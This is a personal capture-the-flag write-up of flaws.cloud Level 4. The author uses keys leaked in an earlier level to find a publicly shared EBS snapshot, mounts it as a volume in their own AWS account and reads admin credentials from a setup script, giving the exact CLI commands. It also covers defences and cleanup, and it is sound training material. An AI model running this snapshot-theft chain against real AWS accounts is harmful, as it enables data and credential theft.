# Lab 04 — flaws.cloud: Exposed EBS Snapshot → Data Exfiltration

**Date:** 2026-11-03
**Difficulty:** Intermediate / Advanced
**Time taken:** ~1 hour

---

## 🎯 Objective
Work through Level 4 of flaws.cloud: an admin web page is protected by HTTP
authentication, but a **snapshot (backup) of the server's disk** was left
accessible to any authenticated AWS user. The goal: find the snapshot, rebuild it
as a disk in my own account, mount it, and extract the admin password.

## 🧰 AWS services / tools used
- Amazon EC2 (instances)
- Amazon EBS (snapshots & volumes)
- AWS CLI (v2) with a named profile
- SSH + Linux (`lsblk`, `mount`)
- IAM (reused the leaked keys recovered in Lab 3)

## 🗺️ What I did (steps)

1. **Used the leaked keys from Lab 3** (profile `flaws`) to identify the account and
   list the backups (snapshots) it owns:
   ```
   aws sts get-caller-identity --profile flaws
   aws ec2 describe-snapshots --owner-ids <account-id> --profile flaws --region us-west-2
   ```
   Found a snapshot shared with authenticated users: `snap-0b49342abd1bdcb89`.

2. **Launched a small t2.micro instance** in my own account (free tier) to act as a
   workbench, and noted its Availability Zone (`us-west-2c`).

3. **Created a volume from the exposed snapshot** — in my own account, in the same AZ
   as my instance:
   ```
   aws ec2 create-volume --availability-zone us-west-2c --snapshot-id snap-0b49342abd1bdcb89 --region us-west-2
   ```
   > ⚠️ Gotcha: a volume can only attach to an instance in the **same Availability
   > Zone**. My first attempt put the volume in `us-west-2a` while the instance was
   > in `us-west-2c`, which failed with `InvalidVolume.ZoneMismatch`. Recreated it in
   > the correct AZ.

4. **Attached the volume** to my instance and SSH'd in:
   ```
   aws ec2 attach-volume --volume-id <vol-id> --instance-id <instance-id> --device /dev/sdf --region us-west-2
   ssh -i Lab4Key.pem ec2-user@<public-ip>
   ```

5. **Found and mounted the stolen disk:**
   ```
   lsblk                      # showed the extra disk: xvdf -> xvdf1
   sudo mkdir -p /mnt/stolen
   sudo mount /dev/xvdf1 /mnt/stolen
   ```

6. **Read the server's setup script**, which contained the admin credentials:
   ```
   sudo cat /mnt/stolen/home/ubuntu/setupNginx.sh
   # htpasswd -b /etc/nginx/.htpasswd flaws <PASSWORD-REDACTED>
   ```

7. **Logged into the Level 4 admin page** with username `flaws` + the recovered
   password → solved the level and revealed the Level 5 link.

8. **Tore everything down** (see Cleanup).

## 💡 What I learned
- EBS **snapshots can be shared with "all authenticated AWS users"** — the exact same
  trap as Level 2, but now for an entire disk backup. Anyone with an AWS account can
  rebuild that disk in their own account and read everything on it.
- A snapshot is a **full copy of the filesystem** — config files, scripts, secrets,
  keys. Treating a backup as less sensitive than the live server is a serious mistake.
- A volume and the instance it attaches to must be in the **same Availability Zone**.
- This chained directly off Lab 3: **leaked keys → enumerate snapshots → exfiltrate
  data.** Small misconfigurations compound.

## 🛡️ How it maps to the real world
Exposed snapshots and AMIs are a well-known breach vector. A cloud security engineer
prevents this by:
- **Never sharing snapshots/AMIs publicly or with "all authenticated users"** —
  audit sharing permissions regularly.
- **Encrypting EBS volumes and snapshots** — encrypted snapshots can't be shared this
  way, so encryption-at-rest also closes this hole.
- **Least privilege** on `ec2:ModifySnapshotAttribute` so developers can't expose
  snapshots in the first place.
- **Detecting** public/shared snapshots automatically with AWS Config rules or tools
  like Prowler.

## 🔒 Note on the redacted password
The recovered admin password is **intentionally redacted** here — credentials never
belong in a public repo, even practice ones.

## 🧹 Cleanup
- Terminated the EC2 instance.
- Deleted every volume I created from the snapshot (including the wrong-AZ ones).
- Verified no running instances or leftover volumes remained, so there are no ongoing
  charges.

---
*Part of my AWS cloud security lab portfolio.*
